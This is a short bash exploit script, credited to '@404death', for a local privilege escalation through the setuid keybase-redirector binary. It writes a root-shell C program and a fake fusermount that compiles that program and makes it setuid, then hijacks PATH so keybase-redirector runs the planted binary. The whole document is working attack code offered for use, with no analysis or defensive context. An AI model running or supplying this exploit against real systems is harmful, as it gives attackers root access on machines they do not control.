#!/bin/bash
# @404death
# setuid keybase-redirector exploit 

cat <<EOF > suid.c
int main(void){
  setresuid(0, 0, 0);
  system("/bin/bash");
}
EOF
cat >fusermount.c<<EOF
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

int main(int argc, char **argv)
{
  setreuid(0,0);
  system("/usr/bin/gcc /home/user/suid.c -o /suid && /usr/bin/chmod +s /suid");
  return(0);
}
EOF
gcc -Wall fusermount.c -o fusermount
env PATH=.:$PATH /usr/bin/keybase-redirector /keybase

